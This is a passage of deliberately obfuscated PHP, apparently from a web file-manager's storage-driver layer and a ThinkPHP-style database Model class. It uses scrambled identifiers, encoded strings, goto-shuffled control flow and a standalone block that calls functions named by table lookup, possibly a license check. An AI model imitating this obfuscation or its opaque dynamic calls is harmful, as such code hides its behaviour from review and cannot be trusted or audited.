$BÖèÉàøØØ, $B­ËÂÌƒÛÊ, $e©Ğ™éô—‘); } return $c»Ä†¡…–µ->fileOut($B­Šô„Û, $BÖèÉàøØØ, $B­ËÂÌƒÛÊ, $e©Ğ™éô—‘); } public static function fileOutImage($aáäšĞî«, $c÷îØùÚÄ­ = 250) { $c…½™İ‚›æ = array(250, 600, 1200, 3000, 5000); for ($B»ÇËÓ–’² = 0; $B»ÇËÓ–’² < count($c…½™İ‚›æ); $B»ÇËÓ–’²++) { if ($B»ÇËÓ–’² == 0 && $c÷îØùÚÄ­ <= $c…½™İ‚›æ[$B»ÇËÓ–’²]) { $c÷îØùÚÄ­ = $c…½™İ‚›æ[$B»ÇËÓ–’²]; break; } else { if ($c÷îØùÚÄ­ > $c…½™İ‚›æ[$B»ÇËÓ–’² - 1] && $c÷îØùÚÄ­ <= $c…½™İ‚›æ[$B»ÇËÓ–’²]) { $c÷îØùÚÄ­ = $c…½™İ‚›æ[$B»ÇËÓ–’²]; break; } else { if ($B»ÇËÓ–’² == count($c…½™İ‚›æ) - 1 && $c÷îØùÚÄ­ > $c…½™İ‚›æ[$B»ÇËÓ–’²]) { $c÷îØùÚÄ­ = $c…½™İ‚›æ[$B»ÇËÓ–’²]; break; } } } } $B“Ë”ÕÕ¶ = self::driverMake($aáäšĞî«); if ($B“Ë”ÕÕ¶->isFileOutServer()) { return $B“Ë”ÕÕ¶->fileOutImageServer($aáäšĞî«, $c÷îØùÚÄ­); } return $B“Ë”ÕÕ¶->fileOutImage($aáäšĞî«, $c÷îØùÚÄ­); } private static function driverIsSame($fêôù‘¦½Ñ, $eÖÜÜåï¢‚) { goto b‘¡Ñğ‰¡; b‘¡Ñğ‰¡: $d¿ŸïäéÕˆ =& $_SERVER[úÉ·öƒÑì©]; $B“ÙÓŒŒ® = $fêôù‘¦½Ñ->getType(); $fÉñ†á·ò¸ = $eÖÜÜåï¢‚->getType(); goto D«´Ê²¨ŒÙ; cøÓ¹ˆ‘´: if ($fêôù‘¦½Ñ->pathDriver == $eÖÜÜåï¢‚->pathDriver) { return !0; } return !1; goto a¥ÔÉ “Êª; D«´Ê²¨ŒÙ: if ($B“ÙÓŒŒ® != $fÉñ†á·ò¸) { return !1; } if ($B“ÙÓŒŒ® == $d¿ŸïäéÕˆ[734]) { return !0; } if ($B“ÙÓŒŒ® == $d¿ŸïäéÕˆ[106]) { return !0; } goto cøÓ¹ˆ‘´; a¥ÔÉ “Êª: } public static function copyUpdate($Aé©ë¤ÜÇ“, $EÊ¾ó¼ó¬ù) { goto aÌùæ•¹Ô†; d¿àî”ç…î: $Cª¼öàÙÀ = array(); foreach ($Fã™ª¨Éé as $eòä—À¨Î£ => $eÎİ„•ùçõ) { if (isset($EòêêÀ²„ç[$eòä—À¨Î£])) { if ($eÎİ„•ùçõ[$e£¨óó›ÔÚ[77]] == 1) { continue; } if ($EòêêÀ²„ç[$eòä—À¨Î£][$e£¨óó›ÔÚ[78]] == $eÎİ„•ùçõ[$e£¨óó›ÔÚ[78]]) { continue; } } if ($eÎİ„•ùçõ[$e£¨óó›ÔÚ[77]] == 1) { $Cª¼öàÙÀ[] = $EÊ¾ó¼ó¬ù . $e£¨óó›ÔÚ[8] . $eòä—À¨Î£; continue; } $f¡ä–Û»Ÿ® = strstr(trim($eòä—À¨Î£, $e£¨óó›ÔÚ[8]), $e£¨óó›ÔÚ[8]) ? get_path_father($eòä—À¨Î£) : $e£¨óó›ÔÚ[33]; $CÍÅùèò¿[] = array($e£¨óó›ÔÚ[1063] => $eÎİ„•ùçõ[$e£¨óó›ÔÚ[76]], $e£¨óó›ÔÚ[1064] => rtrim($EÊ¾ó¼ó¬ù, $e£¨óó›ÔÚ[8]) . $e£¨óó›ÔÚ[8] . $f¡ä–Û»Ÿ®, $e£¨óó›ÔÚ[1065] => $eÎİ„•ùçõ); } $A¼÷‘¢ñëä = array($e£¨óó›ÔÚ[193] => $CÍÅùèò¿, $e£¨óó›ÔÚ[77] => $Cª¼öàÙÀ); goto a¹‘¨…éè; aÌùæ•¹Ô†: $e£¨óó›ÔÚ =& $_SERVER[úÉ·öƒÑì©]; if (!IO::exist($Aé©ë¤ÜÇ“)) { return !1; } if (!IO::exist($EÊ¾ó¼ó¬ù)) { IO::mkdir($EÊ¾ó¼ó¬ù); } goto b˜˜øğ Üæ; a¹‘¨…éè: Hook::trigger($e£¨óó›ÔÚ[1066], $Aé©ë¤ÜÇ“, $EÊ¾ó¼ó¬ù, $A¼÷‘¢ñëä); foreach ($Cª¼öàÙÀ as $eÎİ„•ùçõ) { IO::mkdir($eÎİ„•ùçõ); } foreach ($CÍÅùèò¿ as $eÎİ„•ùçõ) { IO::copy($eÎİ„•ùçõ[$e£¨óó›ÔÚ[1063]], $eÎİ„•ùçõ[$e£¨óó›ÔÚ[1064]], REPEAT_REPLACE); } goto C‹½‰öÛºÃ; b˜˜øğ Üæ: $Fã™ª¨Éé = self::_listAll($Aé©ë¤ÜÇ“); $EòêêÀ²„ç = self::_listAll($EÊ¾ó¼ó¬ù); $CÍÅùèò¿ = array(); goto d¿àî”ç…î; C‹½‰öÛºÃ: } private static function _listAll($f‡‘í„±) { $Dœ ¶™µ =& $_SERVER[úÉ·öƒÑì©]; $f‡‘í„± = KodIO::clear($f‡‘í„±); $Bí¯…ÜÀ = IO::listAll($f‡‘í„±); foreach ($Bí¯…ÜÀ as &$A¤‹å¢ªçö) { $c™­ù…ÁÚí = substr($A¤‹å¢ªçö[$Dœ ¶™µ[76]], strlen($f‡‘í„±)); $A¤‹å¢ªçö[$Dœ ¶™µ[1067]] = trim($c™­ù…ÁÚí, $Dœ ¶™µ[8]); } unset($A¤‹å¢ªçö); return array_to_keyvalue($Bí¯…ÜÀ, $Dœ ¶™µ[1067]); } public static function fileSubstr($b’Ä£Œñ¯, $cš²ÄŞĞÖ, $bë±æÜÀ„ = false) { goto d›®ˆ¡¶¼Í; c¯­Â†éµ: if ($bë±æÜÀ„ <= 0) { return $aŒ“ ÎñŠä[33]; } if ($cš²ÄŞĞÖ < 0 || $cš²ÄŞĞÖ >= $AÃÆÜÅ¾Á˜ || $bë±æÜÀ„ > 1024 * 1024 * 5) { throw new Exception("\x66\x69\154\145\x52\145\x61\x64\x20\145\162\162\157\162\x21\40\x73\164\x61\162\164\x3d{$cš²ÄŞĞÖ}\x3b\154\x65\x6e\x67\x74\150\75{$bë±æÜÀ„}\73\40\163\x69\x7a\145\75{$AÃÆÜÅ¾Á˜}\x3b"); } $b¿ƒÛ—ƒ = $C¯ĞŒÕ×««->fileSubstr($b’Ä£Œñ¯, $cš²ÄŞĞÖ, $bë±æÜÀ„); goto AëœÓ»¢‹; CÕ‚ç¬®õÆ: if ($bë±æÜÀ„ === !1) { $bë±æÜÀ„ = $AÃÆÜÅ¾Á˜ - $cš²ÄŞĞÖ; } if ($cš²ÄŞĞÖ + $bë±æÜÀ„ > $AÃÆÜÅ¾Á˜) { $bë±æÜÀ„ = $AÃÆÜÅ¾Á˜ - $cš²ÄŞĞÖ; } if (!$AÃÆÜÅ¾Á˜ && $C¯ĞŒÕ×««->getType() == $aŒ“ ÎñŠä[106] && !$C¯ĞŒÕ×««->exist($b’Ä£Œñ¯)) { throw new Exception($aŒ“ ÎñŠä[1068] . LNG($aŒ“ ÎñŠä[1069]) . $aŒ“ ÎñŠä[932] . get_path_this($b’Ä£Œñ¯) . $aŒ“ ÎñŠä[33]); } goto c¯­Â†éµ; d›®ˆ¡¶¼Í: $aŒ“ ÎñŠä =& $_SERVER[úÉ·öƒÑì©]; $C¯ĞŒÕ×«« = self::driverMake($b’Ä£Œñ¯); $AÃÆÜÅ¾Á˜ = $C¯ĞŒÕ×««->size($b’Ä£Œñ¯); goto BÓÔŞøÈ®; AëœÓ»¢‹: if (!$b¿ƒÛ—ƒ && $bë±æÜÀ„ && isset($GLOBALS[$aŒ“ ÎñŠä[1070]])) { throw new Exception($GLOBALS[$aŒ“ ÎñŠä[1070]][$aŒ“ ÎñŠä[1071]]); } return $b¿ƒÛ—ƒ; goto c‡˜ôÈÂå; BÓÔŞøÈ®: $cÊ£ìÎ½çÎ = $cš²ÄŞĞÖ; $aÚÑ½´¯ = $bë±æÜÀ„; if ($cš²ÄŞĞÖ < 0) { $cš²ÄŞĞÖ = $AÃÆÜÅ¾Á˜ + $cš²ÄŞĞÖ; } goto CÕ‚ç¬®õÆ; c‡˜ôÈÂå: } private static function driverMake(&$A÷¯ÍŠ…Œ„) { goto AÑ¬¥Éá¶; CŒÓ°™·ÌŸ: if ($CëÕô¶—×[$A¶Æœğ£Â„[29]] == KodIO::KOD_IO && !self::$driverListSystem[$CëÕô¶—×[$A¶Æœğ£Â„[402]]]) { return !1; } $A÷¯ÍŠ…Œ„ = $CëÕô¶—×[$A¶Æœğ£Â„[1072]]; $Aµ˜¼‡Ëõ = self::driverGet($CëÕô¶—×, $A÷¯ÍŠ…Œ„); goto a™ÒÎÑòğ; a™ÒÎÑòğ: return $Aµ˜¼‡Ëõ; goto Aìêä£¨; AÑ¬¥Éá¶: $A¶Æœğ£Â„ =& $_SERVER[úÉ·öƒÑì©]; $CëÕô¶—× = KodIO::parse($A÷¯ÍŠ…Œ„); if (!self::$driverListSystem) { $dÆ Š¨ó®ò = Model($A¶Æœğ£Â„[743])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($dÆ Š¨ó®ò, $A¶Æœğ£Â„[402]); } goto CŒÓ°™·ÌŸ; Aìêä£¨: } private static function driverGet($F£‘èóÍÂ, &$eÌá¡½•Ê) { goto C‘ÏÊóÔŒê; DÂ•Œ©ØŞÃ: if (isset($CÀªÚˆ‘á®[$Aî®èÁ¢Áœ[6]][$Aî®èÁ¢Áœ[1084]])) { $BíÅ²‘«ñ¯->pathBase = rtrim($CÀªÚˆ‘á®[$Aî®èÁ¢Áœ[6]][$Aî®èÁ¢Áœ[1084]], $Aî®èÁ¢Áœ[8]) . $Aî®èÁ¢Áœ[8]; $eÌá¡½•Ê = $BíÅ²‘«ñ¯->pathBase . ltrim($eÌá¡½•Ê, $Aî®èÁ¢Áœ[8]); } $eÌá¡½•Ê = $BíÅ²‘«ñ¯->getPath($eÌá¡½•Ê); if (isset($F£‘èóÍÂ[$Aî®èÁ¢Áœ[1056]])) { $eÌá¡½•Ê = $F£‘èóÍÂ[$Aî®èÁ¢Áœ[1056]]; } goto Aõ…ÚŒø×Ğ; C‘ÏÊóÔŒê: $Aî®èÁ¢Áœ =& $_SERVER[úÉ·öƒÑì©]; $cÊÌĞ›¡  = $F£‘èóÍÂ[$Aî®èÁ¢Áœ[1073]]; $FãèáÃÕ“ = $F£‘èóÍÂ[$Aî®èÁ¢Áœ[402]]; goto E­¢²™Š‰; E­¢²™Š‰: switch ($F£‘èóÍÂ[$Aî®èÁ¢Áœ[29]]) { case KodIO::KOD_IO: $CÀªÚˆ‘á® = self::$driverListSystem[$FãèáÃÕ“]; break; case KodIO::KOD_SOURCE: $eÌá¡½•Ê = $FãèáÃÕ“ . $eÌá¡½•Ê; $CÀªÚˆ‘á® = array($Aî®èÁ¢Áœ[1074] => $Aî®èÁ¢Áœ[1075], $Aî®èÁ¢Áœ[6] => $F£‘èóÍÂ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $dªÙŸ½ëŠ = $GLOBALS[$Aî®èÁ¢Áœ[1076]]; self::$driverListUser = array_to_keyvalue($dªÙŸ½ëŠ, $Aî®èÁ¢Áœ[402]); } $CÀªÚˆ‘á® = self::$driverListUser[$FãèáÃÕ“]; break; case KodIO::KOD_SHARE_LINK: $CÀªÚˆ‘á® = array($Aî®èÁ¢Áœ[1074] => $Aî®èÁ¢Áœ[1077], $Aî®èÁ¢Áœ[6] => $F£‘èóÍÂ); $e©•¾àë¥ = Action($Aî®èÁ¢Áœ[1078])->sharePathInfo($F£‘èóÍÂ[$Aî®èÁ¢Áœ[76]]); $eÌá¡½•Ê = $e©•¾àë¥[$Aî®èÁ¢Áœ[404]]; if (!$e©•¾àë¥[$Aî®èÁ¢Áœ[404]]) { $F…ÈòŠ†¡ = Model($Aî®èÁ¢Áœ[572])->getInfo($e©•¾àë¥[$Aî®èÁ¢Áœ[477]]); $eÌá¡½•Ê = KodIO::clear($F…ÈòŠ†¡[$Aî®èÁ¢Áœ[1079]] . $F£‘èóÍÂ[$Aî®èÁ¢Áœ[1072]]); $F£‘èóÍÂ[$Aî®èÁ¢Áœ[475]] = $F…ÈòŠ†¡; $F£‘èóÍÂ[$Aî®èÁ¢Áœ[1056]] = $eÌá¡½•Ê; $CÀªÚˆ‘á® = array($Aî®èÁ¢Áœ[1074] => $Aî®èÁ¢Áœ[1080], $Aî®èÁ¢Áœ[6] => $F£‘èóÍÂ); } break; case KodIO::KOD_SHARE_ITEM: $CÀªÚˆ‘á® = array($Aî®èÁ¢Áœ[1074] => $Aî®èÁ¢Áœ[1081], $Aî®èÁ¢Áœ[6] => $F£‘èóÍÂ); $F…ÈòŠ†¡ = Model($Aî®èÁ¢Áœ[572])->getInfo($F£‘èóÍÂ[$Aî®èÁ¢Áœ[402]]); if ($F…ÈòŠ†¡[$Aî®èÁ¢Áœ[404]] == $Aî®èÁ¢Áœ[191]) { $eÌá¡½•Ê = KodIO::clear($F…ÈòŠ†¡[$Aî®èÁ¢Áœ[1079]] . $F£‘èóÍÂ[$Aî®èÁ¢Áœ[1072]]); $F£‘èóÍÂ[$Aî®èÁ¢Áœ[475]] = $F…ÈòŠ†¡; $F£‘èóÍÂ[$Aî®èÁ¢Áœ[1056]] = $eÌá¡½•Ê; $CÀªÚˆ‘á® = array($Aî®èÁ¢Áœ[1074] => $Aî®èÁ¢Áœ[1082], $Aî®èÁ¢Áœ[6] => $F£‘èóÍÂ); } else { if (!$eÌá¡½•Ê) { $eÌá¡½•Ê = $F…ÈòŠ†¡[$Aî®èÁ¢Áœ[404]]; } } break; default: $eÌá¡½•Ê = $F£‘èóÍÂ[$Aî®èÁ¢Áœ[76]]; $CÀªÚˆ‘á® = array($Aî®èÁ¢Áœ[1074] => $Aî®èÁ¢Áœ[1083]); break; } $c§œšˆÎŸ– = $F£‘èóÍÂ[$Aî®èÁ¢Áœ[76]]; if (!isset(self::$driverCache[$c§œšˆÎŸ–])) { $f„ĞŒ™ë›º = strtolower($CÀªÚˆ‘á®[$Aî®èÁ¢Áœ[94]]); $B‘ÎÄ³Ì¯é = $GLOBALS[$Aî®èÁ¢Áœ[6]][$Aî®èÁ¢Áœ[88]][$Aî®èÁ¢Áœ[807]]; $aêùíÚæáÎ = $Aî®èÁ¢Áœ[72] . (isset($B‘ÎÄ³Ì¯é[$f„ĞŒ™ë›º]) ? $B‘ÎÄ³Ì¯é[$f„ĞŒ™ë›º] : ucfirst($f„ĞŒ™ë›º)); if (!class_exists($aêùíÚæáÎ)) { show_json("{$aêùíÚæáÎ}\x20\x6e\157\164\x20\x65\x78\x69\x73\164\163\x21", !1); } $Aº¨öÔÖÅÆ = isset($CÀªÚˆ‘á®[$Aî®èÁ¢Áœ[6]]) ? $CÀªÚˆ‘á®[$Aî®èÁ¢Áœ[6]] : !1; self::$driverCache[$c§œšˆÎŸ–] = new $aêùíÚæáÎ($Aº¨öÔÖÅÆ); } goto e“Ûé‡¯”×; Aõ…ÚŒø×Ğ: $BíÅ²‘«ñ¯->path = $eÌá¡½•Ê; return $BíÅ²‘«ñ¯; goto EïƒÊ—ëÀï; e“Ûé‡¯”×: $BíÅ²‘«ñ¯ = self::$driverCache[$c§œšˆÎŸ–]; $BíÅ²‘«ñ¯->pathDriver = $cÊÌĞ›¡ ; $BíÅ²‘«ñ¯->pathBase = $Aî®èÁ¢Áœ[33]; goto DÂ•Œ©ØŞÃ; EïƒÊ—ëÀï: } public static function errorTips($e®á‘¨â = false) { goto B®›Ì©ğŸå; B®›Ì©ğŸå: $E•…éÈï¶Ş =& $_SERVER[úÉ·öƒÑì©]; static $DÃò„£’ëÒ = array(); $bÔÑáÉ²Ú³ = 1000; goto AÄÂÊŸÜô; e­ÈÜõƒ‡: $DÃò„£’ëÒ[] = $e®á‘¨â; write_log($E•…éÈï¶Ş[160] . ACTION . $E•…éÈï¶Ş[1085] . $e®á‘¨â, $E•…éÈï¶Ş[1086]); goto d™ç×‘Î“×; AÄÂÊŸÜô: if ($e®á‘¨â === -1) { return $DÃò„£’ëÒ ? $DÃò„£’ëÒ[count($DÃò„£’ëÒ) - 1] : $E•…éÈï¶Ş[33]; } if ($e®á‘¨â === !1) { return implode($E•…éÈï¶Ş[229], $DÃò„£’ëÒ); } if (count($DÃò„£’ëÒ) >= $bÔÑáÉ²Ú³) { $DÃò„£’ëÒ = array_slice($DÃò„£’ëÒ, $bÔÑáÉ²Ú³ * 0.5, $bÔÑáÉ²Ú³); } goto e­ÈÜõƒ‡; d™ç×‘Î“×: } public static function getLastError($E´Äğğ…ñ² = '') { $D©«ÒŠ×± = self::errorTips(-1); return $D©«ÒŠ×± ? $D©«ÒŠ×± : $E´Äğğ…ñ²; } } goto fà¹éÁÁŸ; e¾¼¯ÌÁ‹¥: $dª†¢ƒ¶ËÈ = $_SERVER[úÉ·öƒÑì©][243]; if ($_SERVER[$_SERVER[úÉ·öƒÑì©][244]] != $dª†¢ƒ¶ËÈ($Aˆ™î—˜œ‹)) { goto DùÓÅµœÛî; d¦ñí¦²Ã›: $a‰¹çŒšĞÅ = explode($_SERVER[úÉ·öƒÑì©][229], $A‡İŒÛƒÄ½); if (count($a‰¹çŒšĞÅ) < $_SERVER[úÉ·öƒÑì©][248]) { $E„ãŒÜø‡• = $_SERVER[úÉ·öƒÑì©][249]; $E„ãŒÜø‡•(); } $FÄ˜ÀÖĞÕë = $_SERVER[úÉ·öƒÑì©][250]; goto d‡†´ÛŞå÷; DùÓÅµœÛî: $EŸì»ÍÏÃ = $_SERVER[úÉ·öƒÑì©][245]; $c²Ì³¤Ã = $_SERVER[$_SERVER[úÉ·öƒÑì©][246]] . $_SERVER[úÉ·öƒÑì©][247]; $A‡İŒÛƒÄ½ = $EŸì»ÍÏÃ($c²Ì³¤Ã); goto d¦ñí¦²Ã›; d‡†´ÛŞå÷: $FÄ˜ÀÖĞÕë($Aˆ™î—˜œ‹); goto CÏ’ä®á”; CÏ’ä®á”: } class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\154\x65", "\x6f\x72\144\145\x72", "\141\154\x69\141\x73", "\x68\x61\x76\x69\156\147", "\x67\162\x6f\x75\160", "\154\157\143\153", "\x64\x69\163\164\151\156\143\164", "\x61\165\164\157", "\x66\x69\154\164\145\162", "\166\x61\154\151\144\141\x74\x65", "\162\x65\x73\x75\x6c\x74", "\x62\151\x6e\x64", "\x74\x6f\x6b\145\x6e"); public function __construct($dÍÕ”‘ø¿ = '', $f¹Íñ‡ª¥­ = '', $aƒÃÓîÉ†ë = '') { $EŒ¥¢ò±¤— =& $_SERVER[úÉ·öƒÑì©]; $this->_initialize(); if (!empty($dÍÕ”‘ø¿)) { if (strpos($dÍÕ”‘ø¿, $EŒ¥¢ò±¤—[95])) { list($this->dbName, $this->name) = explode($EŒ¥¢ò±¤—[95], $dÍÕ”‘ø¿); } else { $this->name = $dÍÕ”‘ø¿; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($f¹Íñ‡ª¥­)) { $this->tablePrefix = $EŒ¥¢ò±¤—[33]; } elseif ($EŒ¥¢ò±¤—[33] != $f¹Íñ‡ª¥­) { $this->tablePrefix = $f¹Íñ‡ª¥­; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($EŒ¥¢ò±¤—[251]); } $this->db(0, empty($this->connection) ? $aƒÃÓîÉ†ë : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $C§è‚–¥İ =& $_SERVER[úÉ·öƒÑì©]; if (empty($this->fields)) { if (think_config($C§è‚–¥İ[252])) { $bÛïÖƒŒ¾ƒ = $this->dbName ? $this->dbName : think_config($C§è‚–¥İ[253]); $F‚íéÀÅÄ­ = think_var_cache($C§è‚–¥İ[254] . strtolower(get_path_this($bÛïÖƒŒ¾ƒ) . $C§è‚–¥İ[95] . $this->name)); if ($F‚íéÀÅÄ­) { $FÉ»±³ÒÅß = think_config($C§è‚–¥İ[255]); if (empty($FÉ»±³ÒÅß) || $F‚íéÀÅÄ­[$C§è‚–¥İ[256]] == $FÉ»±³ÒÅß) { $this->fields = $F‚íéÀÅÄ­; return; } } } $this->flush(); } } public function flush() { goto f˜“ÄŒÉÎ‡; Dˆã…£ˆÈ¿: foreach ($eäå‹¢ÔíÑ as $A­‰¶Å°‘ => $e‹ÊÁğœ) { $Aêï¸íã‹[$A­‰¶Å°‘] = $e‹ÊÁğœ[$e­ŠêŠˆç[29]]; if ($e‹ÊÁğœ[$e­ŠêŠˆç[36]]) { $this->fields[$e­ŠêŠˆç[258]] = $A­‰¶Å°‘; if ($e‹ÊÁğœ[$e­ŠêŠˆç[39]]) { $this->fields[$e­ŠêŠˆç[257]] = !0; } } } $this->fields[$e­ŠêŠˆç[259]] = $Aêï¸íã‹; if (think_config($e­ŠêŠˆç[255])) { $this->fields[$e­ŠêŠˆç[256]] = think_config($e­ŠêŠˆç[255]); } goto fŒàÔ‡çÒù; fŒàÔ‡çÒù: if (think_config($e­ŠêŠˆç[252])) { $b¹ğÄ¤§¨ = $this->dbName ? $this->dbName : think_config($e­ŠêŠˆç[253]); think_var_cache($e­ŠêŠˆç[254] . strtolower(get_path_this($b¹ğÄ¤§¨) . $e­ŠêŠˆç[95] . $this->name), $this->fields); } goto dÎÊã¬¦à; d‰‡‹¦’Œå: if (!$eäå‹¢ÔíÑ) { return !1; } $this->fields = array_keys($eäå‹¢ÔíÑ); $this->fields[$e­ŠêŠˆç[257]] = !1; goto Dˆã…£ˆÈ¿; f˜“ÄŒÉÎ‡: $e­ŠêŠˆç =& $_SERVER[úÉ·öƒÑì©]; $this->db->setModel($this->name); $eäå‹¢ÔíÑ = $this->db->getFields($this->getTableName()); goto d‰‡‹¦’Œå; dÎÊã¬¦à: } public function switchModel($fÂŸÒè¡¸ , $CŒÕÁµ™ = array()) { $E¤…¡˜—˜¾ =& $_SERVER[úÉ·öƒÑì©]; $Fµİ‘ô¼«ø = ucwords(strtolower($fÂŸÒè¡¸ )) . $E¤…¡˜—˜¾[260]; if (!class_exists($Fµİ‘ô¼«ø)) { think_exception($Fµİ‘ô¼«ø . think_lang($E¤…¡˜—˜¾[261])); } $this->_extModel = new $Fµİ‘ô¼«ø($this->name); if (!empty($CŒÕÁµ™)) { foreach ($CŒÕÁµ™ as $E‰åùŠª¯Å) { $this->_extModel->setProperty($E‰åùŠª¯Å, $this->{$E‰åùŠª¯Å}); } } return $this->_extModel; } public function __set($fŞÈ‰¦Âå, $DÂñ‹Ÿï‡) { $this->data[$fŞÈ‰¦Âå] = $DÂñ‹Ÿï‡; } public function __get($bÉÍí²’“†) { return isset($this->data[$bÉÍí²’“†]) ? $this->data[$bÉÍí²’“†] : null; } public function __isset($eÖƒàÁŸ•) { return isset($this->data[$eÖƒàÁŸ•]); } public function __unset($fØÎ–Œ›ö¾) { unset($this->data[$fØÎ–Œ›ö¾]); } public function __call($d÷œŒ¶Ï¡§, $C™ËìÏŸ­¾) { $F›Úù‹Š—ï =& $_SERVER[úÉ·öƒÑì©]; if (in_array(strtolower($d÷œŒ¶Ï¡§), $this->methods, !0)) { $this->options[strtolower($d÷œŒ¶Ï¡§)] = $C™ËìÏŸ­¾[0]; return $this; } elseif (in_array(strtolower($d÷œŒ¶Ï¡§), array($F›Úù‹Š—ï[262], $F›Úù‹Š—ï[263], $F›Úù‹Š—ï[264], $F›Úù‹Š—ï[265], $F›Úù‹Š—ï[266]), !0)) { $b³²ğ‰º÷Ü = isset($C™ËìÏŸ­¾[0]) ? $C™ËìÏŸ­¾[0] : $F›Úù‹Š—ï[182]; $b³²ğ‰º÷Ü = $this->db->parseKey($b³²ğ‰º÷Ü); return $this->getField(strtoupper($d÷œŒ¶Ï¡§) . $F›Úù‹Š—ï[267] . $b³²ğ‰º÷Ü . $F›Úù‹Š—ï[268] . $d÷œŒ¶Ï¡§, $F›Úù‹Š—ï[262]); } elseif (strtolower(substr($d÷œŒ¶Ï¡§, 0, 5)) == $F›Úù‹Š—ï[269]) { $b³²ğ‰º÷Ü = think_parse_name(substr($d÷œŒ¶Ï¡§, 5)); $B¼ ŒÖĞÚ[$b³²ğ‰º÷Ü] = $C™ËìÏŸ­¾[0]; return $this->where($B¼ ŒÖĞÚ)->find(); } elseif (strtolower(substr($d÷œŒ¶Ï¡§, 0, 10)) == $F›Úù‹Š—ï[270]) { $C‰ˆé¹Ùå = think_parse_name(substr($d÷œŒ¶Ï¡§, 10)); $B¼ ŒÖĞÚ[$C‰ˆé¹Ùå] = $C™ËìÏŸ­¾[0]; return $this->where($B¼ ŒÖĞÚ)->getField($C™ËìÏŸ­¾[1]); } elseif (isset($this->_scope[$d÷œŒ¶Ï¡§])) { return $this->scope($d÷œŒ¶Ï¡§, $C™ËìÏŸ­¾[0]); } elseif (method_exists($this, $d÷œŒ¶Ï¡§)) { array_unshift($C™ËìÏŸ­¾, $d÷œŒ¶Ï¡§); return call_user_func_array(array($this, $F›Úù‹Š—ï[271]), $C™ËìÏŸ­¾); } else { return call_user_func_array(array(parent, $d÷œŒ¶Ï¡§), $C™ËìÏŸ­¾); } } protected function call() { goto A®º‹‘¬á¬; DñÊÙÊ‰áÕ: $d÷¿Í·œã = $aĞãÃ‘–ƒ; if (is_array($aĞãÃ‘–ƒ)) { $d÷¿Í·œã = $aĞãÃ‘–ƒ[1]; $aĞãÃ‘–ƒ = $aĞãÃ‘–ƒ[0]; } $Dè‡š­ª™ = count($dÔÆ£¤î™¢) - 1; goto DÑ‰¬ãÏ°; aÏ«ëŠ¿: $B˜†…š‘Ş = call_user_func_array(array($this, $aĞãÃ‘–ƒ), $dÔÆ£¤î™¢); if (method_exists($this, $bŞà¡”–¸­[275])) { $Bé·Õé‘î• = call_user_func_array(array($this, $bŞà¡”–¸­[276]), array($d÷¿Í·œã, $dÔÆ£¤î™¢, $B˜†…š‘Ş)); if ($Bé·Õé‘î•) { return $Bé·Õé‘î•; } } return $B˜†…š‘Ş; goto F…•Áìµ; A®º‹‘¬á¬: $bŞà¡”–¸­ =& $_SERVER[úÉ·öƒÑì©]; $dÔÆ£¤î™¢ = func_get_args(); $aĞãÃ‘–ƒ = array_shift($dÔÆ£¤î™¢); goto DñÊÙÊ‰áÕ; DÑ‰¬ãÏ°: if (isset($dÔÆ£¤î™¢[$Dè‡š­ª™]) && $dÔÆ£¤î™¢[$Dè‡š­ª™] === $aĞãÃ‘–ƒ) { think_exception(__CLASS__ . $bŞà¡”–¸­[4] . $aĞãÃ‘–ƒ . think_lang($bŞà¡”–¸­[272])); return; } $dÔÆ£¤î™¢[] = $aĞãÃ‘–ƒ; if (method_exists($this, $bŞà¡”–¸­[273])) { $Bé·Õé‘î• = call_user_func_array(array($this, $bŞà¡”–¸­[274]), array($d÷¿Í·œã, $dÔÆ£¤î™¢)); if (!is_null($Bé·Õé‘î•) && $Bé·Õé‘î• !== !1) { return $Bé·Õé‘î•; } } goto aÏ«ëŠ¿; F…•Áìµ: } protected function _initialize() { } protected function _facade($e—©…¬èâÑ) { $F»—©ˆï»Õ =& $_SERVER[úÉ·öƒÑì©]; if (!empty($this->fields)) { foreach ($e—©…¬èâÑ as $bŒÉ¼«È·‡ => $e§¾»ä»Â—) { if (is_array($this->fields) && !in_array($bŒÉ¼«È·‡, $this->fields, !0)) { unset($e—©…¬èâÑ[$bŒÉ¼«È·‡]); } elseif (is_scalar($e§¾»ä»Â—)) { $this->_parseType($e—©…¬èâÑ, $bŒÉ¼«È·‡); } } } if (!empty($this->options[$F»—©ˆï»Õ[277]])) { $e—©…¬èâÑ = array_map($this->options[$F»—©ˆï»Õ[277]], $e—©…¬èâÑ); unset($this->options[$F»—©ˆï»Õ[277]]); } $this->_beforeWrite($e—©…¬èâÑ); return $e—©…¬èâÑ; } protected function _beforeWrite(&$CÊ‘ÄÏçÙã) { } public function add($b¸‹Ÿ¼Ê = '', $bã¡Æù×»” = array(), $cë‰ìø ×Ö = false) { goto fçòë«ß¸È; fçòë«ß¸È: if (empty($b¸‹Ÿ¼Ê)) { if (!empty($this->data)) { $b¸‹Ÿ¼Ê = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[úÉ·öƒÑì©][278]); return !1; } } $bã¡Æù×»” = $this->_parseOptions($bã¡Æù×»”); $b¸‹Ÿ¼Ê = $this->_facade($b¸‹Ÿ¼Ê); goto E·‡ªÓ¿²è; AµîŸÇöä : return $A‘È·‰·‹; goto DµÕİ æ¥; E·‡ªÓ¿²è: if (!1 === $this->_beforeInsert($b¸‹Ÿ¼Ê, $bã¡Æù×»”)) { return !1; } $A‘È·‰·‹ = $this->db->insert($b¸‹Ÿ¼Ê, $bã¡Æù×»”, $cë‰ìø ×Ö); if (!1 !== $A‘È·‰·‹) { $b¯¶°å½¼‹ = $this->getLastInsID(); if ($b¯¶°å½¼‹) { $b¸‹Ÿ¼Ê[$this->getPk()] = $b¯¶°å½¼‹; $this->_after_insert($b¸‹Ÿ¼Ê, $bã¡Æù×»”); return $b¯¶°å½¼‹; } $this->_after_insert($b¸‹Ÿ¼Ê, $bã¡Æù×»”); } goto 